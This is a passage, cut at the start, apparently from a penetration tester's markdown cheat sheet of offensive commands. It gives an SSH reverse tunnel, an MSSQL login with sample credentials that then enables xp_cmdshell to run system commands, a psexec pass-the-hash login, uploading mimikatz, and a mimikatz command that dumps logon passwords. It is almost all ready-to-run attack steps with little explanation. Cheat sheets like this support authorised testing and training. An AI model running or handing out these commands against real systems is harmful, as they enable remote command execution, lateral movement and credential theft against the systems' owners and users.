ssh -R 5901:127.0.0.1:5901 kali@192.168.11.11
```

#phpinfo

```shell
phpinfo.php is a file that contains a lot of information that can help attackers
when trying to target a system, such as: database information, host information, and software
version numbers.
```

#mssqlclient.py
```shell
# connecting with credentials
mssqlclient.py -port 1433 sa:D@t@b@535@192.168.132.1


#Enabling xp_cmdshell successfully allows system command execution in mssql
EXEC sp_configure ‘show advanced options’, ‘1’
RECONFIGURE
EXEC sp_configure ‘xp_cmdshell’, ‘1’
RECONFIGURE
EXEC xp_cmdshell ‘net user’;
```

#psexec #mimikatz

```shell
# generic psexec login with psexec
psexec.py <user> @127.0.0.1 -hashes :NTLM_HASH_HERE

# how to upload files or mimikatz using psexec
lput mimikatz.exe

#mimikatz dumping of credentials
mimikatz.exe privilege::debug sekurlsa::logonpasswords
```